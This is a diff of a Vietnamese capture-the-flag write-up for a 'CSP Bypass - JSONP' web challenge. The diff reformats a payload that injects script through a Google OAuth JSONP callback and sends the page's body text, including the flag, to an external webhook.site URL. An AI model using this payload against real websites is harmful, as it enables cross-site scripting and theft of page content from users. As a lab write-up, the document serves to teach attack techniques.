@@ -1,5 +1,5 @@
 ```diff
-@@ Web-Client Challenge
+@@ Web-Client Challenge @@
 ```
 
 ## CSP Bypass - JSONP [45 Points]
@@ -44,7 +44,9 @@
 
 - Đặt script mong  muốn của ta vào nội dung tham số callback => Ta đã có được source script để inject
 
-  ``` Payload: <script src="https://accounts.google.com/o/oauth2/revoke?callback=function myFunction(){ var a = document.getElementsByTagName('body')[0].textContent; document.location='https://webhook.site/03c97039-b00e-4820-91c6-6424602b0e7f?c='.concat(a)}; setTimeout(myFunction, 2000)"></script>```
+  ```javascript
+  Payload: <script src="https://accounts.google.com/o/oauth2/revoke?callback=function myFunction(){ var a = document.getElementsByTagName('body')[0].textContent; document.location='https://webhook.site/03c97039-b00e-4820-91c6-6424602b0e7f?c='.concat(a)}; setTimeout(myFunction, 2000)"></script>
+  ```
 
   - Giải thích Payload: tham số callback nhận giá trị là một function, nên em định nghĩa ra một function để thực hiện đọc nội dung tag ```<body>``` của response. Sau đó gửi nội dung đó tới webhook của mình. Lưu ý ở đây là vì thẻ script nằm phía trên phần nội dung có flag, nếu script được trigger ngay lúc đó sẽ không đọc được nội dung bên dưới. Vậy nên ta phải dùng hàm setTimeout để đợi trình duyệt render hết nội dung của html rồi mới thực hiện script.
 
